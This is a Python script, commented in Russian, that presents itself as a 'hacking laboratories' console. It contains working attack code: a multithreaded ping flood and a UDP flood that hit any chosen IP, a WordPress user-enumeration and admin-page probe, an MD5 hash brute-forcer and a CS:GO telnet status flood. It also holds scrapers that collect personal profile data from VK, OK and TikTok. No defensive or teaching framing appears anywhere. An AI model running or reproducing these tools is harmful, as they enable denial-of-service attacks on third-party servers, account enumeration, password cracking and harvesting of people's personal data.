from colorama import init
from colorama import Fore, Back, Style
from pystyle import Colors, Colorate
import pystyle
import time
import datetime
import os
import requests
from bs4 import BeautifulSoup
import random
import socket
import threading
import webbrowser
import sys
import argparse
import builtwith
import json
from itertools import product
import hashlib
from telnetlib import Telnet
from fake_useragent import UserAgent
import subprocess

#используется argparse для корректной работы с Windows и Linux. При отсутствии аргументов стандартно будет выбран Windows.
parser = argparse.ArgumentParser()
parser.add_argument ('-s', '--system', default='windows', help='Используйте флаг для того, чтобы выбрать систему. Стандартно выбрана Windows')
args = parser.parse_args()

init(autoreset=True) #авторесет для colorama

ua = UserAgent() #переменная содержающая функцию библиотеки fake_useragent

#ASCII ART
def art():
    print(Fore.RED + '''


	██████╗  ██╗███╗   ███╗ ██████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗            
	██╔══██╗███║████╗ ████║██╔═══██╗████╗  ██║██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝            
	██║  ██║╚██║██╔████╔██║██║   ██║██╔██╗ ██║██║     ███████║█████╗  ██║     █████╔╝             
	██║  ██║ ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║     ██╔══██║██╔══╝  ██║     ██╔═██╗             
	██████╔╝ ██║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║███████╗╚██████╗██║  ██╗            
	╚═════╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝            
	██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗                                         
	██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝                                         
	███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗                                        
	██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║                                        
	██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝                                        
	╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                         
	██╗      █████╗ ██████╗  ██████╗ ██████╗  █████╗ ████████╗ ██████╗ ██████╗ ██╗███████╗███████╗
	██║     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗██║██╔════╝██╔════╝
	██║     ███████║██████╔╝██║   ██║██████╔╝███████║   ██║   ██║   ██║██████╔╝██║█████╗  ███████╗
	██║     ██╔══██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗██║██╔══╝  ╚════██║
	███████╗██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║██║███████╗███████║
	╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝''')

#checker section
def checker(url):
    getbrowser = f'https://check-host.net/check-http?host={url}'
    webbrowser.open(getbrowser, new=2)
    print('Готово!')

#ping section
def ping(host):
    packets = input('Размер пакетов: ')
    threads = int(input('Количество потоков: '))
    system = args.system #получение аргументов
    if system == 'windows':
        for _ in range(threads):
            os.system(f'start ping {host} -l {packets} -t')
    elif system == 'linux':
        for _ in range(threads):
            process = subprocess.Popen(f'ping {host} -s {packets}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            command_output = process.stdout.read().decode('utf-8')
            print(command_output)

#tiktok parsing section
def tiktokparsing(username):
    try:
        url = f'https://socialblade.com/tiktok/user/{username}' #статистика socialblade
        headers = {
            'User-Agent': ua.random,
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
        }
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        unwanted = soup.find('div', attrs={'style': 'float: right; opacity: 0.7; font-weight: bold;'})
        unwanted.extract() #выбрасывает ненужный код html
        infos = soup.find_all('div', class_='YouTubeUserTopInfo')
        counts = [] #данные наполняются в пустой массив
    except AttributeError:
        print(Fore.RED + 'У этого аккаунта меньше 25000 тысяч подписчиков, поэтому его нет в базе данных.')
        return
    
    for i in infos:
            itemName = i.find('span', class_='YouTubeUserTopLight')
            itemCount = i.find('span', attrs={'style': 'font-weight: bold;'})
            print(f'{itemName.text}: {itemCount.text}')
            counts.append(f'{itemName.text}: {itemCount.text}')

    saveit = input('Сохранить в TXT файл? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('TikTokData.txt', 'w') as file:
            file.write(f'Username: {username}\n' + '\n'.join(counts))

#vk parsing section
def vkparsing(url):
    headers = {
        'User-Agent': ua.random,
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    name = soup.find('h1', class_='page_name').text
    infos = soup.find_all('a', class_='page_counter')
    counts = [] #данные наполняются в пустой массив
    print(name)

    for i in infos:
        itemName = i.find('div', class_='label')
        itemCount = i.find('div', class_='count')
        print(f'{itemName.text}: {itemCount.text}')
        counts.append(f'{itemName.text}: {itemCount.text}')
    saveit = input('Сохранить в TXT файл? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('VKdata.txt', 'w') as file:
            file.write(f'URL: {url}\n' + '\n'.join(counts))

#ok parsing section
def okparsing(url):
    headers = {
        'User-Agent': ua.random,
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    name = soup.find('a', class_='profile-user-info_name')
    birthday = soup.find('div', attrs={"data-type": "AGE"})
    photo = soup.find('a', class_='recent-photos_total-counter')
    friends = soup.find('a', attrs={"data-l": "outlandermenu,friendFriend"}).find('span')
    groups = soup.find('a', attrs={"data-l": "outlandermenu,friendAltGroup"}).find('span')
    games = soup.find('a', attrs={"data-l": "outlandermenu,friendApps"}).find('span')

    print(f'Пользователь:  {name.text}')
    print(f'Дата рождения: {birthday.text}')
    print(f'Количество друзей: {friends.text}')
    print(f'Количество групп: {groups.text}')
    print(f'Количество фотографий: {photo.text}')
    print(f'Количество игр: {games.text}')
    saveit = input('Сохранить в TXT файл? (y or n): ')
    if saveit == 'Y' or saveit == 'y':
        with open('OKdata.txt', 'w') as file:
            file.write(f'URL: {url}\nПользователь: {name.text}\nДата рождения: {birthday.text}\nКоличество друзей: {friends.text}\nКоличество групп: {groups.text}\nКоличество фотографий: {photo.text}\nКоличество игр: {games.text}')

#udp flood section
def launchudp(ip, port, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=attackudp, args=(ip, port, until))
            thd.start()
        except:
            pass

def attackudp(ip, port, until_datetime):
    data = random._urandom(1024)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        i = random.choice(('[*]', '[&]', '[#]'))
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(t):
                s.sendto(data, addr)
                print(Fore.GREEN + i + ' Отправлено!')
        except:
            print(Fore.RED + '[@] Ошибка!')

#wordpress section
def urlTools(url):
    if url.lower().startswith('https://') or url.lower().startswith('http://'):
        url = url.replace('http://','').replace('https://','') #убирает https:// или http:// в начале ссылки
    return url

def getusernamewordpress(url):
    Headers = {
    'Accept':'*/*',
    'User-Agent': ua.random
    }
    r = requests.get(f'{url}/wp-json/wp/v2/users/', headers=Headers).text
    j = json.loads(r)
    count = len(j) - 1
    attempts = 0
    user = ''
    for _ in j:
        split = '\n'
        if count == attempts :
            split = ''
        users = j[attempts ]['slug']
        if not users == '':
            user += Fore.GREEN + '   ' + '[+] ' + users + split
        attempts += 1
    if user == '':
        user = Fore.RED + 'Не найдено!'
    return user

def adminpage(url):
    r = requests.get(f'{url}/wp-admin', allow_redirects=False)
    adminpageurl = ''
    if r.status_code == 200:
        adminpageurl = Fore.RED + 'Не найдено!'
    elif r.status_code == 301:
        adminpageurl = Fore.GREEN + '   ' + f'{url}/wp-admin'
    return adminpageurl

def infoaboutwebsite(url):
    data = builtwith.parse(url)
    return data

def wordpressgetinfo(Target):
    try:
        url = urlTools(Target).title()
        Ip = socket.gethostbyname(url)
    except socket.gaierror:
        total_dot = url.count('.')
        if total_dot > 1:
            print(Fore.RED + 'Домены третьего уровня не поддерживаются!')
            return
        else:
            print(Fore.RED + 'Такого домена не существует!')
            return
            
    Username = Fore.YELLOW + '[+] Пользователи: \n' + getusernamewordpress(f'http://{url}')
    Adminpageurl = Fore.YELLOW + '[+] Админка: \n' + adminpage(f'http://{url}')
    Infowebsite = Fore.YELLOW + '[+] Информация: \n' + str(infoaboutwebsite(f'http://{url}'))
    print(Fore.RED + f'Домен: {url}\nIP: {Ip}\n{Infowebsite}\n{Username}\n{Adminpageurl}') #вывод информации

#Brute MD5 Section
def computeMD5hash(string):
  m = hashlib.md5()
  m.update(string.encode('utf-8'))
  return m.hexdigest()

def BruteMD5(md5hash, minlen, maxlen):

    chr = '''1): ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz1234567890
2): abcdefghijklnmopqrstuvwxyz1234567890
3): ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
4): 1234567890
5): ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz
6): ABCDEFGHIJKLMNOPQRSTUVWXYZ
7): abcdefghijklnmopqrstuvwxyz'''

    print(chr)

    char_num = int(input('Выберите символы: '))

    if char_num == 1:
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz1234567890'
    elif char_num == 2:
        chars = 'abcdefghijklnmopqrstuvwxyz1234567890'
    elif char_num == 3:
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    elif char_num == 4:
        chars = '1234567890'
    elif char_num == 5:
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklnmopqrstuvwxyz'
    elif char_num == 6:
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    elif char_num == 7:
        chars = 'abcdefghijklnmopqrstuvwxyz'
    else:
        print(Fore.RED + 'Такого варианта не существует!')
        return

    saveit = str(input('Сохранить в TXT? (Y/N): '))
    if saveit == 'Y' or saveit == 'y':
        name = input('Имя файла без расширения: ') + '.txt'

    stop = 0
    found = 0
    lines = 0

    if saveit == 'Y' or saveit == 'y':
        filetxt = open(name, 'w')

    startedtime = time.time()

    for length in range(minlen, maxlen):
        to_attempt = product(chars, repeat=length)
        for attempt in to_attempt:
          crypt = computeMD5hash(''.join(attempt))
          if crypt == md5hash:
            print(Fore.GREEN + '[CRACKED] {} = {}\n'.format(crypt, ''.join(attempt)))
            if saveit == 'Y' or saveit == 'y':
              filetxt.write('[CRACKED] {} = {}\n'.format(crypt, ''.join(attempt)))
            stop = 1
            found = 1
            break
          else:
            if saveit == 'Y' or saveit == 'y':
              filetxt.write('{} = {}\n'.format(crypt, ''.join(attempt)))
            print('{} - {}'.format(''.join(attempt), crypt))
            lines += 1
        if stop == 1:
          break

    if saveit == 'Y' or saveit == 'y':
        filetxt.close()
    now = time.time()
    timespent = now - startedtime

    print(Fore.GREEN + 'Готово! Завершено через {} секунд. Всего хэшей было сгенерированно - {}'.format(str(timespent), str(lines)))
    if found == 0:
        print(Fore.RED + 'MD5 не сбручен :(')

#csgo flood section
def csgoflood(port):
    timer = 0.035 #Таймер настроен под официльные сервера
    try:
        with Telnet('localhost', port) as tn:
            print('Соединение установлено!')
            start = input('Запустить скрипт? (Y или N): ')
            if start == 'Y' or start == 'y':
                while True:
                    tn.write(b"status\n")
                    time.sleep(timer)
            else:
                exit(1)
    except ConnectionRefusedError:
        print('Хост не найден!')

def clear():
    system = args.system
    if system == 'windows':
        os.system('cls')
    elif system == 'linux':
        os.system('clear') 


art()

#запуск цикла с "командной" строкой
while True:
    time.sleep(1.25)
    start = input(Colorate.Horizontal(Colors.purple_to_red, '''
    
    ╔═══[root@Hacker]
    ╚══> ''', 1))
    if start == 'help':
        print(Fore.GREEN + '''
		$ checkhost - проверка хоста на работоспособность
		$ ping - нагрузка сервера многопоточными Ping запросами (PingOfDeath)
		$ tiktokpasrser - парсинг данных с ТикТока
		$ vkpasrser - парсинг данных с ВКонтакте
		$ okparser - парсинг данных с одноклассников
		$ udpflood - атака на IP до отказа (UDP)
		$ wordpress - информация о CMS Wordpress
		$ brutemd5 - брутфорс md5 хэша
		$ csgoflood - CSGO Status Flood (Параметры запуска CSGO: -netconport [тут порт])
		$ clear - очистка консоли
		$ exit - выход
		''')
        pass
    if start == 'checkhost':
        clear()
        url = input('URL: ')
        checker(url)
    if start == 'ping':
        clear()
        host = input('Хост (IP): ')
        ping(host)
    if start == 'okparser':
        clear()
        url = input('OK (url): ')
        okparsing(url)
    if start == 'udpflood':
        clear()
        ip = str(input('IP: '))
        port = int(input('Port: '))
        thread = int(input('Thread: '))
        t = int(input('Times: '))
        launchudp(ip, port, thread, t)
    if start == 'tiktokparser':
        clear()
        username = input('TikTok username (without @): ')
        tiktokparsing(username)
    if start == 'vkparser':
        clear()
        url = input('VK (url): ')
        vkparsing(url)
    if start == 'wordpress':
        clear()
        Target = str(input('URL: '))
        wordpressgetinfo(Target)
    if start == 'brutemd5':
        clear()
        md5hash = input('MD5 Hash: ')
        minlen = int(input('Минимальная длина брута: '))
        maxlen = int(input('Максимальная длина брута: '))
        BruteMD5(md5hash, minlen, maxlen)
    if start == 'csgoflood':
        clear()
        port = input('Порт для подключения: ')
        csgoflood(port)
    if start == 'clear':
        clear()
    if start == 'exit':
        exit(1)